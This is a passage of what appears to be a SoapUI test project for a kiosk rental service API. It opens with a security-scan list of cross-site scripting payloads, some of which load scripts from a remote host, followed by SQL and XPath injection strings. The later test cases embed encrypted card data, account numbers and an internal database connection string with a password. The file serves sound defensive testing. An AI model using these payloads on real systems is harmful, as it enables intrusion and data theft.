BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings><con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings></con:config><con:assertion type="Sensitive Information Exposure" id="61a7839b-c213-4293-813b-8a03caebe638" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="CrosSiteScript" id="c87f5801-ce79-4944-a3c8-ddeb875390f7" name="Cross Site Scripting Detection"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="121ab627-ee99-4b8f-a27b-a0fc792ea5b9" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:minimal>5</con:minimal><con:maximal>15</con:maximal><con:numberOfRequest>100</con:numberOfRequest></con:config><con:assertion type="Sensitive Information Exposure" id="47966016-e23a-46ac-a6fe-8d0fe419e94a" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ALL_AT_ONCE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="47929af5-b5f4-406a-afb0-ba8903b18b35" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>'--</con:sqlInjectionStrings><con:sqlInjectionStrings>1'</con:sqlInjectionStrings><con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings><con:sqlInjectionStrings>1/0</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings><con:sqlInjectionStrings>;</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings><con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings><con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings></con:config><con:assertion type="Sensitive Information Exposure" id="dd10a3de-53fc-464d-bb26-125698296649" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="9c92e356-3bd1-40be-adbd-a4bb1d6a8db3" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:xpathList> or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList><con:xpathList>' or '1'='1</con:xpathList><con:xpathList>1/0</con:xpathList><con:xpathList>'%20o/**/r%201/0%20--</con:xpathList><con:xpathList>' o/**/r 1/0 --</con:xpathList><con:xpathList>;</con:xpathList><con:xpathList>'%20and%201=2%20--</con:xpathList><con:xpathList>' and 1=2 --</con:xpathList><con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList><con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList></con:config><con:assertion type="Sensitive Information Exposure" id="24e21339-8ed8-4ebb-8343-b977af7de762" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="04a1b843-b867-4f4c-9aab-2671430ef023" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:deselectedMethods/></con:config><con:assertion type="Sensitive Information Exposure" id="361dbd96-6be8-48e8-adca-97b0470d4ece" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="Valid HTTP Status Codes" id="d866cf34-c07c-4c95-9dcb-66320a501e11" name="Valid HTTP Status Codes"><con:settings><con:setting id="__LEVEL_">WARNING</con:setting></con:settings><con:configuration><codes>501,405,403</codes></con:configuration></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan><con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="8a910517-f2fa-4aae-8f5d-41450307d4cf" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:assertion type="WeakPassword" id="6efd27ed-8d79-4b3b-a44c-d1366c221f51" name="Weak Password Detection"><con:configuration/></con:assertion><con:assertion type="BasicAuth" id="93c2e501-106e-4831-b29f-cd967f794a87" name="Basic Authentication Detection"/><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan></con:testStepSecurityTest><con:properties/><con:reportParameters/></con:securityTest><con:breakPoints><con:testStepId>cf2a43da-fb68-4f28-b647-cabab658b5fb</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c7ac4c10-ab96-4e99-b1ae-b373224e8115</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>2541f1eb-0d1a-4584-8ec1-f3a53a02616e</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>fd683bb0-82e9-4b17-ba81-0d133272fd8e</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>7482ad5c-957f-47b4-b757-a492aefbb406</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>e159f83a-da3c-4a13-b9b9-242c3fec26c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="8692ad80-ef51-4e2a-9c7e-cc3a1713ad69" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="PickupValidation" searchProperties="true" timeout="0"><con:settings/><con:testStep type="groovy" name="Encode Message Body (PickupValidation)" id="beb6dcb6-42a9-47b4-8a5c-03968e548262"><con:settings/><con:config><script>//NOTES: Starting from just for Rental, need to add logic for purchase.
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;

def KioskId= context.expand( '${#TestCase#KioskID}' )
def ccPayload = context.expand( '${#TestCase#CCPayload}' )
requestPayload = "";

//Generate MessageGUID
def MessageId = UUID.randomUUID().toString();
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));
def Email = context.expand( '${#TestCase#Email}');
def TransactionID = context.expand( '${#TestCase#TransactionID}');
def ReferenceNumber = context.expand( '${#TestCase#ReferenceNumber}');
//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"PickupValidation\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"KioskId\": $KioskId,";
requestPayload += "$ccPayload";
requestPayload += "\"TransactionDate\": {";
requestPayload += "\"theDate\": $theDate,";
requestPayload += "\"dateTimeKind\": \"Unspecified\",";
requestPayload += "\"dateString\": \"$dateString\"";
requestPayload += "},";
requestPayload += "\"ReferenceNumbers\": [$ReferenceNumber]";
requestPayload += "}";

// log to soapui log
log.info("PickupValidation Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("PickupGUID",MessageId.toString()); </script></con:config></con:testStep><con:testStep type="httprequest" name="PickupValidation (Request)" id="c245d107-211d-4d7b-9d50-833dc3236439"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="PickupValidation (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())

log.info ("PickupValidation Response: $response")
assert response.contains("\"Success\":true,")
assert response.contains("\"HasErrors\":false,")

</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>Global HTTP Settings</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="jdbc" name="CheckTransaction" id="1609cf7b-54a8-49bc-833d-50c04f0d7f51" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:assertion type="JDBC Status" id="1c53f172-8a7b-4171-a072-27619f91af57" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="groovy" name="Check ReferenceNumber" id="76d320f1-0cfc-4b77-be7c-e8d2f58197c6"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def encodedBody = testRunner.testCase.getTestStepByName('PickupValidation (Request)').getPropertyValue('Response');
def decodedBody = URLDecoder.decode(encodedBody);
def list = new JsonSlurper().parseText( decodedBody );
def TransactionID = list.get('ReferenceNumbers').toString().replaceAll("\\[","").replaceAll("\\]","");
//log.info("Transaction_ID = $TransactionID")
def AccountNumber = list.get('AccountNumber').toString();
def CustomerProfileNumber = list.get('CustomerProfileNumber').toString();
def actualTransactionID = context.expand( '${#TestCase#TransactionID}' );
def actualCustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
def actualAccountNumber = context.expand( '${#TestCase#AccountNumber}' );
//Validation
assert (actualTransactionID == TransactionID);
assert (actualCustomerProfileNumber == CustomerProfileNumber);
assert (actualAccountNumber == AccountNumber);

//log.info("AccountNumber:$AccountNumber; CustomerProfileNumber:$CustomerProfileNumber");</script></con:config></con:testStep><con:properties><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648734</con:value></con:property><con:property><con:name>CCPayload</con:name><con:value>"CreditCard": {"FirstName": "Redbox","LastName": "Server","Number": "hnrCs9ffakBeWpRoL8igs3N4pXwFNmEAQzWoOvMZZ7MKd+hm1npsRQBuEATGG2wUVYN8NjLTW2VOYcMytfR+7iWtB4CjnE3xctffX/5HZzGRkBbWPNW4n/MV7FgaMzvQWydaHY6375XzhDtGv7vhvbr7y2ndVZK63eakKwCcxd0VDEEhk9Mg8GOwfLrzDTSmjZm0Tr5BnhTTjTRSLsxtSztCVmazWlW4jSVw/g8mvlrbRVdqcnYMzqL0qXY8TBJPcHyckMNmwoBqnxMTv8+ZdzVi15sxsIX8NxdUbtpwkqa3B2HVXsXEQB2KY8NhKIS8EJ+Vxf5nw6EmWBD1G70qNz30gVIlfSpLi1WOe7txVEpMoI3rymdb0FuM/xU0YDxbNE1EDA1Ku9/iQWVov4QnnqxXLM8Z5BM0tURDj3go3rpEARUsNt/t4AaVcmMMn+nnHcoDX/iR/Q7Jd+OVFDGA9j607MDfyJlzByIxpV0xNE8KmU2ibh0Ja3sbOZIzprjBQqDeX9g/2pof4bZVwsfpnqWL5IrcpZGKvI+s5kYKJHnXayezgRhYr+h2MvGLpli6T/2TifY9ZpNX/EZZBfqPQ5QnVcsvm9TaWoRELDSIR2k5XAYD+5vEU4pAA4WlzdHhR6NSUuVNVtUldyKsnUvmePQD5vM4zzZRv2dN4mMppfU=","ExpirationMonth": "12","ExpirationYear": "20","KeyId": 100002,"CardId": "LRmLgUrE3rZdtiY+h0thaUhD9TZPJK5tMdxGDrZ7d8Y=","LastFour": "7268","CardType": 6,"Track2": "Io1PisHv1i1UM/JxSFY8AyrGWMnI1OD4OB7Aqcb69YKmNohPuJyrOGO2QL739+p6sLm4YlcUhte2ooRtfZ5sCaktjA7VWxvu9CnbjKqJ8cx2KFf8Ur6DxIhmRl1Gs2e38+y9NnlSGamHRWwRg2VzhQ7t1Bnjk632GrG8Z4DiZy1QwjacQ44/9fcI/1wANXjSGake61UISVYLBcCKYXvv13wdjJ6An5x7z/cld9hl0X7v3crHFIrw3WGARskzyqNgb6AWrH7YCsZMhNhSeYNXcdr19DSu6fSGpoeShTw8YKA4z1DmCmiPZNzhWCwOP098GRbya7AVcEcQJ8j5VICKHfckQwrqz33ouZKV1Exfg8wYMMEkQKjbND49Af0iEHGeCRKfuDxY9CAF+Ma58xM/4c6At42qm8zcVdN34k+H1tPkanccT4LGlElrymdMBRJ/YwlHnYQRWeSZnXGHToHqMimhPfw+z6/j1uPO9Q6zhY/Zkg2lCC1yL5KrLKj6dy32G2CJMibZkXtQtMaxXWAGIIv8uoTHy5ttbIWUv0bZ+8wu2PjaptOwlgneq5a8jpjuoCx4bu6lgEExvYgQ9ZR0ps2GcxguqgYRJ925eBO663tYS+p//rwl6nOpOQmN819X1RWITWnhU/7jTc+2e6Tx+mP5fal+V0yEXhu7BU3eNdU="},</con:value></con:property><con:property><con:name>TransactionID</con:name><con:value>1983225</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value/></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22PickupValidation%22%2C%22MessageId%22%3A+%22447c7085-0f62-4582-91b2-0ea2de5546ef%22%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22KioskId%22%3A+1505%2C%22CreditCard%22%3A+%7B%22FirstName%22%3A+%22Redbox%22%2C%22LastName%22%3A+%22Server%22%2C%22Number%22%3A+%22hnrCs9ffakBeWpRoL8igs3N4pXwFNmEAQzWoOvMZZ7MKd%2Bhm1npsRQBuEATGG2wUVYN8NjLTW2VOYcMytfR%2B7iWtB4CjnE3xctffX%2F5HZzGRkBbWPNW4n%2FMV7FgaMzvQWydaHY6375XzhDtGv7vhvbr7y2ndVZK63eakKwCcxd0VDEEhk9Mg8GOwfLrzDTSmjZm0Tr5BnhTTjTRSLsxtSztCVmazWlW4jSVw%2Fg8mvlrbRVdqcnYMzqL0qXY8TBJPcHyckMNmwoBqnxMTv8%2BZdzVi15sxsIX8NxdUbtpwkqa3B2HVXsXEQB2KY8NhKIS8EJ%2BVxf5nw6EmWBD1G70qNz30gVIlfSpLi1WOe7txVEpMoI3rymdb0FuM%2FxU0YDxbNE1EDA1Ku9%2FiQWVov4QnnqxXLM8Z5BM0tURDj3go3rpEARUsNt%2Ft4AaVcmMMn%2BnnHcoDX%2FiR%2FQ7Jd%2BOVFDGA9j607MDfyJlzByIxpV0xNE8KmU2ibh0Ja3sbOZIzprjBQqDeX9g%2F2pof4bZVwsfpnqWL5IrcpZGKvI%2Bs5kYKJHnXayezgRhYr%2Bh2MvGLpli6T%2F2TifY9ZpNX%2FEZZBfqPQ5QnVcsvm9TaWoRELDSIR2k5XAYD%2B5vEU4pAA4WlzdHhR6NSUuVNVtUldyKsnUvmePQD5vM4zzZRv2dN4mMppfU%3D%22%2C%22ExpirationMonth%22%3A+%2212%22%2C%22ExpirationYear%22%3A+%2220%22%2C%22KeyId%22%3A+100002%2C%22CardId%22%3A+%22LRmLgUrE3rZdtiY%2Bh0thaUhD9TZPJK5tMdxGDrZ7d8Y%3D%22%2C%22LastFour%22%3A+%227268%22%2C%22CardType%22%3A+6%2C%22Track2%22%3A+%22Io1PisHv1i1UM%2FJxSFY8AyrGWMnI1OD4OB7Aqcb69YKmNohPuJyrOGO2QL739%2Bp6sLm4YlcUhte2ooRtfZ5sCaktjA7VWxvu9CnbjKqJ8cx2KFf8Ur6DxIhmRl1Gs2e38%2By9NnlSGamHRWwRg2VzhQ7t1Bnjk632GrG8Z4DiZy1QwjacQ44%2F9fcI%2F1wANXjSGake61UISVYLBcCKYXvv13wdjJ6An5x7z%2Fcld9hl0X7v3crHFIrw3WGARskzyqNgb6AWrH7YCsZMhNhSeYNXcdr19DSu6fSGpoeShTw8YKA4z1DmCmiPZNzhWCwOP098GRbya7AVcEcQJ8j5VICKHfckQwrqz33ouZKV1Exfg8wYMMEkQKjbND49Af0iEHGeCRKfuDxY9CAF%2BMa58xM%2F4c6At42qm8zcVdN34k%2BH1tPkanccT4LGlElrymdMBRJ%2FYwlHnYQRWeSZnXGHToHqMimhPfw%2Bz6%2Fj1uPO9Q6zhY%2FZkg2lCC1yL5KrLKj6dy32G2CJMibZkXtQtMaxXWAGIIv8uoTHy5ttbIWUv0bZ%2B8wu2PjaptOwlgneq5a8jpjuoCx4bu6lgEExvYgQ9ZR0ps2GcxguqgYRJ925eBO663tYS%2Bp%2F%2Frwl6nOpOQmN819X1RWITWnhU%2F7jTc%2B2e6Tx%2BmP5fal%2BV0yEXhu7BU3eNdU%3D%22%7D%2C%22TransactionDate%22%3A+%7B%22theDate%22%3A+636814536261260000%2C%22dateTimeKind%22%3A+%22Unspecified%22%2C%22dateString%22%3A+%222018-12-26T14%3A40%3A26.0000126%22%7D%2C%22ReferenceNumbers%22%3A+%5B5648734%5D%7D</con:value></con:property><con:property><con:name>PickupGUID</con:name><con:value>447c7085-0f62-4582-91b2-0ea2de5546ef</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>75527813105188</con:value></con:property><con:property><con:name>AccountNumber</con:name><con:value>81461737632253</con:value></con:property></con:properties><con:reportParameters/></con:testCase><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="Pickup" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" id="244b9377-68dc-460b-9a89-0525f9e4f922"><con:description/><con:settings/><con:testStep type="groovy" name="Encode Message Body (Pickup)" id="0ca93a54-de08-487a-839d-0eb2b0484915"><con:settings/><con:config><script><![CDATA[//NOTES: Starting from just for Rental, need to add logic for purchase.
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
Round16 = new DecimalFormat("#.################"); //Rounding the amount to 16 decimals.

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);
def KioskId= context.expand( '${#TestCase#KioskID}' )

//Reconcile
vendedRentalBarcodes = [];
vendedPurchaseBarcodes = [];
int VendedRentalsCount = 0;
int VendedPurchaseCount = 0;
nonvendedRentalBarcodes = [];
nonvendedPurchaseBarcodes = [];

rentalPayload = "\"rental\" : { \"Items\" : [";
BigDecimal rentalTotal = 0;
purchasePayload = "\"purchase\" : { \"Items\" : [";
BigDecimal purchaseTotal = 0;
BigDecimal digitalTotal = 0;
rentalTitleIds = []; //will have both rental and purchase titleIds.
requestPayload = "";

def numAddRentals = context.expand( '${#TestCase#numOfRentals}' );
numAddRentalsList = numAddRentals.split(",");
def numAddPurchases = context.expand( '${#TestCase#numOfPurchases}' );
numAddPurchasesList = numAddPurchases.split(",");
BigDecimal discountvalue = (context.expand( '${#TestCase#PromoValue}' ).toBigDecimal()); //PromoCode Value
def rentalFormatIds = context.expand( '${#TestCase#rentalFormats}' );

//Total rental and purchase count
def purchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def rentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();;
log.info ("purchaseCount:$purchaseCount; rentalCount:$rentalCount")
//Rentala and Purchase disc info from Authorize
def purchaseBarcodes = context.expand( '${#TestCase#PurchaseBarcodes}' );
def rentalBarcodes = context.expand( '${#TestCase#RentalBarcodes}' );
def rentalProductType = context.expand( '${#TestCase#RentalProductType}' );
